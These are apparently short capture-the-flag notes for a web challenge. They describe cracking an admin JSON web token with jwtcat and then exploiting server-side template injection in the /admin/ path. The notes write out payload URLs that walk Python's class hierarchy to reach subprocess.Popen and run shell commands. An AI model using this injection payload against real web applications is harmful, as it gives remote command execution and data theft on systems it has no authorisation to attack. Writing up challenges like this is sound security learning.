Use jwtcat to get json web token for admin

Login and find link to /admin

/admin/X

gives a 404 with 'Not found /admin/x'

Try SSTI - works

http://jh2i.com:50023/admin/%7B%7B%20%27%27.__class__.__mro__[1].__subclasses__()%7D%7D lists classes

http://jh2i.com:50023/admin/%7B%7B%20%27%27.__class__.__mro__[1].__subclasses__()[401](%27cat%20flag.txt%27,shell=True,%20stdout=-1).communicate()%20%7D%7D

Use 401, subprocess.popen() to call system to cat flag.txt

